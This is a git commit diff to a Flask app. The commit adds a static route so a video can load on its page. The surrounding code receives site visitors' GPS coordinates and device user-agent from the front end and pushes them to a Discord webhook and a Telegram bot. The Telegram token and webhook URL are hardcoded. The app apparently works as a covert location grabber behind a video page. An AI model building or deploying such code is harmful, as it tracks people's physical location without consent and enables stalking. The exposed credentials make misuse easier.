35ac8e7fe40a8f54d33a6a48195bb81553d38f36
Cheng7871 <2042264067@qq.com>
2026-08-22 22:06:43 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,21 +1,27 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 import requests
+import os
 
 app = Flask(__name__)
 
-# 私密配置，只写在后端，前端完全看不到
+# 私密配置
 TG_TOKEN = "8831992575:AAFPvDrXc_kEiOiT0XHYgJj9E8KSWwR-aBo"
 TG_CHATID = "7763890817"
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1534727827717488710/LLyLVdQiCLWMMX0Uu2TWis66L3DPmvo6Fu05XXKaEwA8Hgp2uSD8F5-B1_uhpZ5frQX4"
 
-# 主页路由，加载前端页面
+# 静态文件，开放static文件夹访问（非常关键，视频才能加载）
+@app.route('/static/<path:filename>')
+def static_files(filename):
+    return send_from_directory("static", filename)
+
+# 主页
 @app.route('/')
 def index():
     with open("index.html","r",encoding="utf-8") as f:
         html = f.read()
     return html
 
-# 接口：接收前端传过来的访客数据，后端执行推送
+# 接收前端数据推送接口
 @app.route("/send_msg",methods=["POST"])
 def send_msg():
     data = request.get_json()
@@ -28,9 +34,9 @@ def send_msg():
 GPS经纬度：{data['gps']}
 设备UA标识：{data['ua']}"""
 
-    #推送到Discord
+    # discord推送
     requests.post(DISCORD_WEBHOOK,json={"content":content})
-    #推送到Telegram
+    # telegram推送
     requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                   json={"chat_id":TG_CHATID,"text":content})
     return jsonify({"code":200,"msg":"发送成功"})
